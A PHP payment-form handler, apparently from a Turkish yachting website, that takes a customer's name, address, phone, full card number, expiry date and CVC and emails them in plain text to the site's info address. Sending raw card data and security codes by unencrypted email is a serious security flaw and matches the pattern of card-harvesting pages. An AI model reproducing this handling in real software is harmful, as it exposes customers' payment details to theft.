<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = 'info@aysenuryatching.com';
    $subject = 'Ödeme Bilgileri';

    $name = $_POST['name'];
    $address = $_POST['address'];
    $phone = $_POST['phone'];
    $cardNumber = $_POST['card-number'];
    $expiryDate = $_POST['expiry-date'];
    $cvc = $_POST['cvc'];
    $totalPrice = $_POST['totalPrice'];

    $message = "İsim Soyisim: $name\nAdres: $address\nTelefon Numarası: $phone\nKart Numarası: $cardNumber\nVade: $expiryDate\nGüvenlik Kodu: $cvc\nToplam Tutar: $totalPrice EURO";

    $headers = "From: no-reply@aysenuryatching.com";

    if (mail($to, $subject, $message, $headers)) {
        http_response_code(200);
        echo "Email başarıyla gönderildi.";
    } else {
        http_response_code(500);
        echo "Email gönderiminde hata oluştu.";
    }
} else {
    http_response_code(403);
    echo "Bu sayfaya erişim yetkiniz yok.";
}
?>
